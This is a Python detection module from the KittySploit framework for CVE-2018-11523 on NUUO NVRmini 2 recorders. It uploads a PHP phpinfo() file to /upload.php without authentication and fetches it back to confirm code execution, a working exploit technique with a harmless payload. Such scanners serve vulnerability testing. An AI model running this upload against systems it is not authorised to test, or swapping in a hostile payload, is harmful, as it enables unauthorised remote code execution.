#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NUUO NVRmini 2 unauthenticated PHP upload (CVE-2018-11523)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NUUO NVRmini 2 - File Upload Detection (CVE-2018-11523)',
        'description': (
            'Detects CVE-2018-11523 by uploading a PHP phpinfo() payload to /upload.php '
            'and verifying execution.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'nuuo', 'nvr', 'upload', 'rce', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2018_14933_detect'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-11523',
            'https://www.exploit-db.com/exploits/44794/',
        ],
        'cve': 'CVE-2018-11523',
    }

    def run(self):
        fname = self.random_text(10) + '.php'
        bound = '---------------------------' + self.random_text(12)
        data = (
            '--' + bound + '\r\n'
            f'Content-Disposition: form-data; name="userfile"; filename="{fname}"\r\n\r\n'
            '<?php phpinfo(); unlink(__FILE__); ?>\r\n'
            '--' + bound + '--\r\n'
        )
        headers = {'Content-Type': f'multipart/form-data; boundary={bound}'}
        self.http_request(
            method='POST', path='/upload.php', data=data, headers=headers, allow_redirects=False,
        )
        r = self.http_request(method='GET', path='/' + fname, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if 'PHP Version' in body and 'PHP API' in body:
            self.set_info(
                severity='critical',
                reason='NUUO NVRmini 2 file upload (CVE-2018-11523)',
                path='/upload.php',
            )
            return True
        return False
